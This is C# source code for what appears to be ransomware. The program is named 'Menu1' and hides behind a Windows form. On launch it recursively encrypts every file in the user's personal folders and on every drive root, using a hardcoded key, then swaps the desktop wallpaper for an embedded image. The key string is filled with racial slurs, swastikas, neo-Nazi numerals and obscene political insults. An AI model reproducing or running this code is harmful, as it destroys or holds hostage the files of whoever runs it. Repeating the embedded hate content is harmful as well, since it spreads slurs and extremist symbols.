using System;
using System.Collections.Generic;
using System.IO;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Reflection;
using System.Runtime.InteropServices;
using GDI;

namespace Menu1
{
    static class Program
    {

      
        static string[] targetDirectories = new string[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"), 
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
        };

 
        static string password = "AppleStringBloxMilitaryWordsRCI)@I)CMKJGkkfdgfhbnjhrtmlghjbgnhsgjrlp[w2242351453870946893468935895333333333333333BbhhasBABAHalalalalalhIT@I)CJGCJ()JDead_CODERv2_VIEBAL_VASY_maMY271378273_EXE_TROJAN_NIGGA_FUCK_YOU_MOMMilitaryzovua_UGOLNI_ZAVOD_ZOV_VVVBY 卍‎: 卍‎: 卍‎: 卍‎: 卍‎:_BY_AZOVSTAL1488_HUI_ZELENSKOGO_WEEDSMOKING";

        [STAThread]
        static void Main()
        {

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

           
            Task.Run(EncryptFilesAsync);
            Task.Run(SaveImageToDesktopAsync);

    
            Application.Run(new Form3());  
        }

      
        public static async Task EncryptFilesAsync()
        {
            try
            {
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                var directoriesList = new List<string>(targetDirectories);

                foreach (var drive in allDrives)
                {
                    if (drive.IsReady)
                        directoriesList.Add(drive.RootDirectory.FullName);
                }

                targetDirectories = directoriesList.ToArray();
                var tasks = new List<Task>();

                foreach (var dir in targetDirectories)
                {
                    tasks.Add(EncryptAllFilesInDirectoryAsync(dir));
                }

                await Task.WhenAll(tasks);
            }
            catch (Exception ex)
            {
        
                Console.WriteLine($"Ошибка при шифровании файлов: {ex.Message}");
            }
        }


        static async Task EncryptAllFilesInDirectoryAsync(string directoryPath)
        {
            try
            {
                string[] files = Directory.GetFiles(directoryPath);
                var fileTasks = new List<Task>();

                foreach (string file in files)
                {
                    fileTasks.Add(Task.Run(() =>
                    {
                        try
                        {
                            FileEncrypting.EncryptFile(file, password);
                        }
                        catch (Exception ex)
                        {
             
                            Console.WriteLine($"Ошибка шифрования файла {file}: {ex.Message}");
                        }
                    }));
                }

                await Task.WhenAll(fileTasks);

                string[] subdirectories = Directory.GetDirectories(directoryPath);
                var subdirectoryTasks = new List<Task>();

                foreach (string subdirectory in subdirectories)
                {
                    subdirectoryTasks.Add(EncryptAllFilesInDirectoryAsync(subdirectory));
                }

                await Task.WhenAll(subdirectoryTasks);
            }
            catch (Exception ex)
            {
 
                Console.WriteLine($"Ошибка в директории {directoryPath}: {ex.Message}");
            }
        }

      
        public static async Task SaveImageToDesktopAsync()
        {
            try
            {
                await Task.Run(() =>
                {
                    var assembly = Assembly.GetExecutingAssembly();
                    string resourceName = "Menu1.Resources.1.jpg"; 

                    using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                    {
                        if (stream != null)
                        {
                            var image = Image.FromStream(stream);
                            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                            string destinationPath = Path.Combine(desktopPath, "wallpaper.jpg");

                            image.Save(destinationPath);

                            Task.Delay(6000).Wait();

                            SetWallpaper(destinationPath); 
                        }
                    }
                });
            }
            catch (Exception ex)
            {
   
                Console.WriteLine($"Ошибка при сохранении изображения: {ex.Message}");
            }
        }

  
        public static void SetWallpaper(string imagePath)
        {
            const int SPI_SETDESKWALLPAPER = 0x0014;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDCHANGE = 0x02;

      
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imagePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
}
